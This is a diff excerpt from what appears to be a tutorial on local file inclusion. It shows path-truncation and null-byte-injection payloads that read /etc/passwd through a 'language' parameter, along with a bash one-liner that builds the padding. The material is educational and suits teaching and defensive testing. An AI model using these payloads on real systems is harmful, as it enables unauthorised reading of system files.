@@ -20,7 +20,9 @@
 ?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
 ```
 
+
 We don't have to manually type ./ 2048 times (a total of 4096 characters).
+
 
 ```
 echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
@@ -33,9 +35,11 @@ non_existing_directory/../../../etc/passwd/./././<SNIP>././././
 > PHP versions prior to 5.5 were vulnerable to null byte injection, meaning that appending a null byte (%00) to the end of a string would terminate it, causing anything following the null byte to be ignored. This is due to how strings are stored in low-level memory, where they require a null byte to mark the end of the string—a convention found in languages ​​such as Assembly, C, and C++.
 
 
+
 ```
 /etc/passwd%00
 ```
+
 
 ```
 ../../../etc/passwd%00
